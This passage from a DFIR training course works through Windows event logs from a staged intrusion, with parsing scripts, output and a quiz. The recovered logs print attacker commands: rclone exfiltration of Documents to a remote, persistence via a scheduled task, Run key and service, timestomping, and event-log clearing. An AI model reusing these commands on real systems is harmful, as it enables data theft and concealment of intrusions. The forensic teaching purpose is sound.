evtxecmd -d $L --csv work/evtx --csvf ws-alice.csv | awk '/^Processing /{n=split($2,a,"/"); f=a[n]; sub(/\.\.\.$/,"",f)} /Records included/{print $3, f}' | sort -k2
```

```
  69632   23 events  Security.evtx
  69632   19 events  System.evtx
  69632    8 events  Microsoft-Windows-PowerShell%4Operational.evtx
  69632    1 events  Microsoft-Windows-TaskScheduler%4Operational.evtx
  69632    2 events  Microsoft-Windows-Partition%4Diagnostic.evtx
  69632    1 events  Microsoft-Windows-Kernel-PnP%4Configuration.evtx
3c4ce3f7c3e9f85b  Microsoft-Windows-Kernel-PnP%4Configuration.evtx
70092a2fa7244728  Microsoft-Windows-Partition%4Diagnostic.evtx
02e707c306a6f68c  Microsoft-Windows-PowerShell%4Operational.evtx
91fa6a2d5db81937  Microsoft-Windows-TaskScheduler%4Operational.evtx
c861ae8e4e271c7a  Security.evtx
55b06dc2e7705f72  System.evtx
File            : evidence/WS-ALICE/Windows/System32/winevt/Logs/Security.evtx (69632 bytes)
Format version  : 3.2    header size 128, header block 4096 bytes
Chunks          : 1 in header (first 0, last 0); 1 chunk slots in the file
Next record ID  : 18257
Flags           : 0x0 (clean)
Header CRC32    : stored 0x1cf21314, calculated 0x1cf21314 -> OK

Chunk 0 at file offset 0x1000
  Records       : IDs 18234-18256 (numbers 18234-18256), 23 records
  Last record at: 0x5278; free space from 0x5380 (44160 bytes free)
  Header CRC32  : stored 0xaccc55ed, calculated 0xaccc55ed -> OK
  Records CRC32 : stored 0xe564d86d, calculated 0xe564d86d -> OK
  String table  : 21 of 64 buckets used; template table: 8 of 32 used
  Record 18234 at 0x0200: 3664 bytes, written 2026-09-28 07:59:05.3311042
      template at 0x0226 (defined here), 20 values: UInt8 UInt8 UInt16 UInt16 Null HexInt64 FILETIME Null UInt32 UInt32 UInt64 UInt8 Null Null Null Null Null Null Null BinXml
  Record 18235 at 0x1050: 1104 bytes, written 2026-09-28 07:59:05.3311187
      template at 0x0226 (reused), 20 values: UInt8 UInt8 UInt16 UInt16 Null HexInt64 FILETIME Null UInt32 UInt32 UInt64 UInt8 Null Null Null Null Null Null Null BinXml
  Record 18236 at 0x14a0: 1568 bytes, written 2026-09-28 10:13:41.2093312
      template at 0x0226 (reused), 20 values: UInt8 UInt8 UInt16 UInt16 Null HexInt64 FILETIME Null UInt32 UInt32 UInt64 UInt8 Null Null Null Null Null Null Null BinXml
1 Microsoft-Windows-Kernel-PnP%4Configuration.evtx
2 Microsoft-Windows-Partition%4Diagnostic.evtx
8 Microsoft-Windows-PowerShell%4Operational.evtx
1 Microsoft-Windows-TaskScheduler%4Operational.evtx
23 Security.evtx
19 System.evtx
```

Six logs, 54 events, all checksums OK. The Security log uses the **Windows 10/11 layout**: version **3.2**, a 20-value System template (the Windows 7 sample had 18), and record IDs that continue from earlier events (18234 onwards, as on a machine that has been running for months). Everything EvtxECmd found is now in one CSV, `work/evtx/ws-alice.csv`: open it in Timeline Explorer on Windows if you can.

### Lab 4: Logons, the spray and the PsExec session (15 min)

```bash
evtx_dump -o jsonl $L/Security.evtx > work/security.jsonl
python3 - work/security.jsonl <<'EOF'
import json, sys
for line in open(sys.argv[1]):
    e = json.loads(line)["Event"]
    s, d, eid = e["System"], e["EventData"], e["System"]["EventID"]
    if eid not in (4624, 4625, 4634, 4647, 4672):
        continue
    t = s["TimeCreated"]["#attributes"]["SystemTime"][:19].replace("T", " ")
    user = d.get("TargetUserName") or d.get("SubjectUserName")
    logon_id = d.get("TargetLogonId") or d.get("SubjectLogonId") or ""
    more = ""
    if eid in (4624, 4625):
        more = f'type {d["LogonType"]} from {d["WorkstationName"]} {d["IpAddress"]}'
    if eid == 4625:
        logon_id, more = "", more + f'  status {d["Status"]} sub {d["SubStatus"]}'
    if eid == 4634:
        more = f'type {d["LogonType"]}'
    print(f"{t}  {eid}  {user:<13} {logon_id:<9} {more}".rstrip())
EOF
python3 - work/security.jsonl <<'EOF'
import json, sys
ids = [json.loads(line)["Event"]["System"]["EventRecordID"] for line in open(sys.argv[1])]
gaps = [(a, b) for a, b in zip(ids, ids[1:]) if b != a + 1]
print(f"EventRecordID {ids[0]}-{ids[-1]}: {len(ids)} records, gaps: {gaps or 'none'}")
EOF
```

```
2026-09-28 07:59:05  4624  alice         0x2a4f1   type 2 from WS-ALICE 127.0.0.1
2026-09-28 07:59:05  4672  alice         0x2a4f1
2026-09-28 18:02:38  4647  alice         0x2a4f1
2026-09-29 00:58:41  4624  alice         0x3a1f2   type 2 from WS-ALICE 127.0.0.1
2026-09-29 00:58:41  4672  alice         0x3a1f2
2026-09-29 01:04:10  4625  administrator           type 3 from LAPTOP-7Q2K 10.20.30.45  status 0xc000006e sub 0xc0000072
2026-09-29 01:04:14  4625  admin                   type 3 from LAPTOP-7Q2K 10.20.30.45  status 0xc000006d sub 0xc0000064
2026-09-29 01:04:19  4625  bob                     type 3 from LAPTOP-7Q2K 10.20.30.45  status 0xc000006d sub 0xc000006a
2026-09-29 01:05:11  4624  bob           0x5c1d2e  type 3 from LAPTOP-7Q2K 10.20.30.45
2026-09-29 01:05:11  4672  bob           0x5c1d2e
2026-09-29 01:08:41  4634  bob           0x5c1d2e  type 3
2026-09-29 07:54:57  4647  alice         0x3a1f2
EventRecordID 18234-18256: 23 records, gaps: none
```

What the Security log says that no artifact so far could:

- **alice was logged on at the console** (type 2) from **00:58:41** until she logged off for the 07:55 restart: one session, Logon ID `0x3a1f2`, with administrator privileges (4672).
- From **01:04:10 to 01:04:19**, a computer called **`LAPTOP-7Q2K` at 10.20.30.45** tried three accounts over the network: `administrator` (account **disabled**), `admin` (**doesn't exist**), `bob` (**wrong password**). That's a small **password spray**.
- **52 seconds later, `bob` logged on successfully** from the same machine (type 3, NTLM), with administrator privileges, until **01:08:41**. bob is a second local user of WS-ALICE (Day 11's ProfileList), so his password was guessed or known. The session's Logon ID `0x5c1d2e` ties it to everything below.
- No gaps in `EventRecordID`: nothing was removed from the middle of this log. (One question for the report: Windows normally gives **remote** logons by local accounts like bob a filtered, non-admin token. Check `LocalAccountTokenFilterPolicy` under `SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`; that the PsExec session worked suggests it was set.)

### Lab 5: Processes, services, tasks and PowerShell (15 min)

```bash
python3 - work/evtx/ws-alice.csv <<'EOF'
import csv, sys
rows = sorted(csv.DictReader(open(sys.argv[1], encoding="utf-8-sig")), key=lambda r: r["TimeCreated"])
for r in rows:
    if r["EventId"] == "4688" and r["TimeCreated"] > "2026-09-29":
        parent = r["PayloadData1"].split("\\")[-1]
        print(f'{r["TimeCreated"][11:19]}  4688  {r["UserName"]:<20} {parent:<14} -> {r["ExecutableInfo"].split(" ", 1)[1]}')
    elif r["EventId"] in ("7045", "4698", "106"):
        print(f'{r["TimeCreated"][11:19]}  {r["EventId"]:<5} {r["PayloadData1"]}  {r["ExecutableInfo"]}'.rstrip())
EOF
evtx_dump -o jsonl $L/Microsoft-Windows-PowerShell%4Operational.evtx > work/powershell.jsonl
python3 - work/powershell.jsonl <<'EOF'
import json, sys
for line in open(sys.argv[1]):
    e = json.loads(line)["Event"]
    s = e["System"]
    if s["TimeCreated"]["#attributes"]["SystemTime"] > "2026-09-29T01:20":
        print("---", s["TimeCreated"]["#attributes"]["SystemTime"][:19], "PID", s["Execution"]["#attributes"]["ProcessID"],
              "user", s["Security"]["#attributes"]["UserID"])
        print(e["EventData"]["ScriptBlockText"])
EOF
```

```
01:05:12  7045  Name: PSEXESVC  %SystemRoot%\PSEXESVC.exe
01:05:12  4688  WORKGROUP\WS-ALICE$  services.exe   -> C:\Windows\PSEXESVC.exe
01:05:14  4688  WORKGROUP\WS-ALICE$  PSEXESVC.exe   -> "cmd"
01:05:20  4688  WS-ALICE\bob         cmd.exe        -> whoami  /all
01:05:44  4688  WS-ALICE\bob         cmd.exe        -> net  localgroup administrators
01:09:31  4688  WS-ALICE\alice       explorer.exe   -> "powershell.exe" -w hidden -nop
01:12:47  4688  WS-ALICE\alice       powershell.exe -> "C:\Users\alice\AppData\Local\Temp\rc\rclone.exe" copy C:\Users\alice\Documents remote:drop --config C:\Users\alice\AppData\Local\Temp\rc\rc.conf
01:21:05  4688  WS-ALICE\alice       powershell.exe -> "C:\Windows\system32\schtasks.exe" /create /tn OneDriveUpdate /xml C:\Users\alice\AppData\Local\Temp\rc\task.xml
01:21:05  4698  TaskName: \OneDriveUpdate
01:21:05  106   Task: \OneDriveUpdate
01:22:10  4688  WS-ALICE\alice       powershell.exe -> "C:\Windows\system32\sc.exe" create OneDriveSync binPath= "C:\Users\alice\AppData\Local\Temp\rc\rclone.exe copy C:\Users\alice\Documents remote:drop" start= auto DisplayName= "OneDrive Sync Helper"
01:22:10  7045  Name: OneDriveSync  C:\Users\alice\AppData\Local\Temp\rc\rclone.exe copy C:\Users\alice\Documents remote:drop
01:22:11  4688  WS-ALICE\alice       powershell.exe -> "C:\Windows\system32\sc.exe" start OneDriveSync
--- 2026-09-29T01:20:44 PID 12052 user S-1-5-21-3623811015-3361044348-30300820-1001
$p = Get-Item "$env:USERPROFILE\Downloads\payload.ps1"
$p.LastWriteTimeUtc = $p.LastAccessTimeUtc = '2019-03-14 10:00:00'
$s = Get-Item "$env:TEMP\svchost.tmp"
$s.CreationTimeUtc = $s.LastWriteTimeUtc = $s.LastAccessTimeUtc = '2019-03-14 10:00:00'
Rename-Item $s.FullName svchost.exe
--- 2026-09-29T01:21:04 PID 12052 user S-1-5-21-3623811015-3361044348-30300820-1001
schtasks /create /tn OneDriveUpdate /xml $env:TEMP\rc\task.xml
--- 2026-09-29T01:21:29 PID 12052 user S-1-5-21-3623811015-3361044348-30300820-1001
Set-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name OneDriveUpdate -Value 'C:\Users\alice\AppData\Local\Temp\rc\rclone.exe copy C:\Users\alice\Documents remote:drop'
--- 2026-09-29T01:22:09 PID 12052 user S-1-5-21-3623811015-3361044348-30300820-1001
sc.exe create OneDriveSync binPath= "C:\Users\alice\AppData\Local\Temp\rc\rclone.exe copy C:\Users\alice\Documents remote:drop" start= auto DisplayName= "OneDrive Sync Helper"
sc.exe start OneDriveSync
--- 2026-09-29T01:38:11 PID 12052 user S-1-5-21-3623811015-3361044348-30300820-1001
Clear-EventLog -LogName 'Windows PowerShell'
```

Two very different actors:

- **bob's remote session (PsExec):** the **7045** at 01:05:12 installs `PSEXESVC` (its System `UserID` is bob's SID, visible in the CSV's `UserId` column); `services.exe` starts `PSEXESVC.exe`, which starts `cmd` **as bob** (the 4688 creator is SYSTEM, the target account bob); bob runs **`whoami /all`** and **`net localgroup administrators`**: reconnaissance. Then he logs off. This matches Day 11's deleted `PSEXESVC` key and Day 12's Prefetch and Amcache.
- **alice's session:** the hidden PowerShell from Day 11's RunMRU (**PID 0x2F14 = 12052**) is the parent of everything that follows: **rclone** (Day 12), the **scheduled task**, the **Run key**, the **service** (three kinds of persistence in two minutes), and two script blocks Days 9–13 could only infer:
  - **01:20:44 timestomping:** sets `payload.ps1`'s modified/accessed times and `svchost.tmp`'s three times to **2019-03-14 10:00:00 UTC**, then renames it to `svchost.exe`. That explains Day 10's findings exactly: a rename copies the `$SI` times into `$FN`, which is why `svchost.exe` showed 2019 in both.
  - **01:38:11 `Clear-EventLog -LogName 'Windows PowerShell'`:** an attempt to cover tracks that only cleared the **classic** "Windows PowerShell" log. The **Operational** log you're reading survived.
- All of alice's actions ran in the same PowerShell process and under her SID. Whether it was alice or someone at her keyboard is a question for the whole case, but it was **her logon session at the console**, not the remote one.

### Lab 6: The USB disk, the cleared log and the power-on periods (15 min)

```bash
evtx_dump -o jsonl $L/Microsoft-Windows-Partition%4Diagnostic.evtx > work/partition.jsonl
python3 - work/partition.jsonl <<'EOF'
import json, sys
for line in open(sys.argv[1]):
    e = json.loads(line)["Event"]
    d, t = e["EventData"], e["System"]["TimeCreated"]["#attributes"]["SystemTime"][:19]
    if not d["Capacity"]:
        print(t, f'disk {d["DiskNumber"]} removed (capacity 0, no partitions)')
        continue
    print(t, d["Manufacturer"], d["Model"], "SerialNumber", d["SerialNumber"], "Capacity", d["Capacity"], "BusType", d["BusType"])
    print("   ParentId", d["ParentId"])
    vbr = bytes.fromhex(d["Vbr0"])
    serial = int.from_bytes(vbr[0x48:0x50], "little")
    print(f'   Vbr0: {vbr[3:11].decode()!r} boot sector, volume serial {serial:016X} (Windows shows the low half: {serial & 0xFFFFFFFF:08X})')
EOF
evtx_dump -o jsonl "$L/Microsoft-Windows-Kernel-PnP%4Configuration.evtx" | python3 -c 'import json,sys; d=json.loads(sys.stdin.readline())["Event"]["EventData"]; print(d["DeviceInstanceId"]); print(d["ParentDeviceInstanceId"])'
python3 - work/evtx/ws-alice.csv <<'EOF'
import csv, sys
rows = sorted(csv.DictReader(open(sys.argv[1], encoding="utf-8-sig")), key=lambda r: r["TimeCreated"])
for r in rows:
    if r["EventId"] in ("12", "13", "6005", "6006", "1074", "104"):
        detail = r["PayloadData3"] if r["EventId"] == "1074" else r["PayloadData1"]
        print(f'{r["TimeCreated"][:19]}  {r["EventId"]:<5} {r["MapDescription"]:<36} {detail}')
EOF
```

```
2026-09-29T01:31:02 Kingston DataTraveler 3.0 SerialNumber E0D55EA574F5E7A1C9A2016B Capacity 31029460992 BusType 7
   ParentId USB\VID_0951&PID_1666\E0D55EA574F5E7A1C9A2016B
   Vbr0: 'NTFS    ' boot sector, volume serial 4A3B1C0D5E1D7A2C (Windows shows the low half: 5E1D7A2C)
2026-09-29T01:36:40 disk 1 removed (capacity 0, no partitions)
USBSTOR\Disk&Ven_Kingston&Prod_DataTraveler_3.0&Rev_PMAP\E0D55EA574F5E7A1C9A2016B&0
USB\VID_0951&PID_1666\E0D55EA574F5E7A1C9A2016B
2026-09-28 07:58:12  12    OS was started                       StartTime: 2026-09-28 07:58:11.5410000
2026-09-28 07:58:24  6005  The Event log service was started    Computer: WS-ALICE
2026-09-28 18:02:39  1074  A user initiated a system restart    Type: power off
2026-09-28 18:02:44  6006  The Event log service was stopped    Computer: WS-ALICE
2026-09-28 18:02:44  13    OS was shutdown                      StopTime: 2026-09-28 18:02:44.6620193
2026-09-29 00:57:01  12    OS was started                       StartTime: 2026-09-29 00:57:01.4320000
2026-09-29 00:57:13  6005  The Event log service was started    Computer: WS-ALICE
2026-09-29 01:38:12  104   Event log cleared                    The Windows PowerShell log file was cleared
2026-09-29 07:54:58  1074  A user initiated a system restart    Type: restart
2026-09-29 07:55:02  6006  The Event log service was stopped    Computer: WS-ALICE
2026-09-29 07:55:02  13    OS was shutdown                      StopTime: 2026-09-29 07:55:02.7710042
2026-09-29 07:58:18  12    OS was started                       StartTime: 2026-09-29 07:58:18.5060000
2026-09-29 07:58:20  6005  The Event log service was started    Computer: WS-ALICE
```

- **The USB drive, identified.** At **01:31:02** a **Kingston DataTraveler 3.0** (USB vendor ID `0951`, product `1666`), serial `E0D55EA574F5E7A1C9A2016B`, about 31 GB, was connected; it was removed at **01:36:40**. Kernel-PnP **400** shows Windows set it up as a **new device**: it had not been connected to WS-ALICE before (or not since its device entry was removed).
- **The link to Day 13.** The event keeps a copy of the drive's **volume boot record**: an **NTFS** volume whose 64-bit serial ends in **`5E1D7A2C`**, exactly the serial in the `spec-01.txt` LNK file and the `E:\finance` Jump List entry. The files copied at 01:33 went to **this physical device**: give its serial number to whoever searches for it.
- **When the machine was on:** 07:58–18:02 on the 28th (a working day), then **booted again at 00:57** in the middle of the night and running until alice's restart at 07:55. Everything this week's labs found happened in that night session.
- **104 at 01:38:12:** alice's account cleared the "Windows PowerShell" log, 0.8 seconds after the `Clear-EventLog` script block in Lab 5.

---

## ✅ Knowledge check

1. Where are the event log files, and what does `%4` in a file name mean?
2. A colleague says "there are no 4688 events, so no programs ran." What's wrong with that?
3. What are an EVTX file's chunk checksums for, and what does the DIRTY flag mean?
4. Why doesn't an `.evtx` file contain the message text you see in Event Viewer, and what are values like `%%1842`?
5. Give the logon type for: console, SMB/PsExec, RDP, scheduled task, service.
6. 4625 events show `0xC000006D`/`0xC0000064` for ten different user names from one IP within a minute. What is it?
7. How do you find everything done in the session of a particular 4624 logon?
8. Which events would you expect on the target of a PsExec command?
9. An attacker ran `wevtutil cl Security`. What trace remains, and what if they cleared "System" instead?
10. How did Lab 6 link a physical USB device to the LNK file from Day 13?

<details>
<summary><b>Answers</b></summary>

1. `C:\Windows\System32\winevt\Logs\`. `%4` stands for `/` in the channel name (`Microsoft-Windows-PowerShell/Operational` → `Microsoft-Windows-PowerShell%4Operational.evtx`).
2. 4688 is only logged if **process creation auditing** is enabled (and command lines need an extra policy). By default it's off. Use Prefetch, Amcache, BAM (Day 12), Sysmon or EDR data instead, and check the audit policy.
3. They detect **damage or modification** of chunk headers and records (CRC32). DIRTY means the file was open/in use when copied (normal for live collections), not that it's corrupt.
4. EVTX stores only the **values** and a template; the message text lives in the provider's **message DLL** on the viewing system. `%%1842` is a reference to a parameter message string (here "Yes"), resolved by viewers like Event Viewer or FullEventLogView.
5. Console **2**, SMB/PsExec **3**, RDP **10**, scheduled task **4**, service **5**.
6. **Password spraying** (or user enumeration): many different names, "no such user", from one source. Look for a later **4624 type 3** from the same IP.
7. Take its **TargetLogonId** and search for it as **SubjectLogonId** (4672, 4688, 4698…) and as **TargetLogonId** in 4634/4647; stay within the session's time window.
8. **4624 type 3** (+ **4672** if admin) from the source host, **7045** service `PSEXESVC` installed, **7036** running/stopped, **4688** `PSEXESVC.exe` and its child processes under the remote user (if audited), **4634** logoff. Plus the registry and file artifacts of Days 11–12.
9. Clearing Security writes **1102** (with the account) as the first event of the new log. Clearing System (or any other log) writes **104** in the System log, naming the channel. Neither can be avoided by `wevtutil cl` itself; then look for gaps, other logs and forwarded copies.
10. Partition/Diagnostic **1006** records the device's vendor, model and **serial number**, and a copy of its **volume boot record**. The NTFS volume serial at offset 0x48 of the VBR (`…5E1D7A2C`) matched the **drive serial number in the LNK file's LinkInfo** (`5E1D7A2C`), so the file was opened from that physical device.

</details>

---

## 📚 Further reading

- Microsoft Learn, *Advanced security audit policy* and the per-event pages (e.g. *4624(S): An account was successfully logged on*)
- libyal, *Windows XML Event Log (EVTX) format* (libevtx documentation on GitHub)
- Eric Zimmerman's `evtx` repository: the maps (`evtx/Maps`) are also a compact reference to what each event means
- JPCERT/CC, *Detecting Lateral Movement through Tracking Event Logs*: which events each attack tool leaves
- SANS *Hunt Evil* and *Windows Forensic Analysis* posters, "Event Logs" sections

---

## ⏭️ Tomorrow: Day 15

**Event-log threat hunting with Sigma rules.** Tools: **Hayabusa**, **Chainsaw**, **DeepBlueCLI**.
Today you read events one by one; tomorrow you'll sweep whole log collections with hundreds of detection rules and see which of tonight's events they catch.

---

<sub>Part of the <a href="../README.md">DFIR Daily</a> series · <a href="../CURRICULUM.md">Full 60-day curriculum</a> · For educational and authorised use only.</sub>
